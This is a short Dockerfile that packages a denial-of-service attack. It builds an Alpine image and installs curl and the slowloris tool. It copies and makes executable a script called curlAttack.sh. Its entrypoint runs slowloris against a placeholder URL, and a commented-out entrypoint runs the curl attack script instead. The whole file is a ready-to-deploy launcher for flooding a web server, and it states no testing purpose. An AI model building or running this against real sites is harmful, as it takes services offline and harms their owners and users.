FROM alpine

RUN apk --no-cache add curl
RUN apk --no-cache add py3-pip
RUN pip3 install slowloris
WORKDIR /usr/src/app
COPY . .

RUN chmod +x /usr/src/app/curlAttack.sh

#ENTRYPOINT ["sh", "./curlAttack.sh", "https://<url>"]
ENTRYPOINT ["slowloris", "http://<url>"]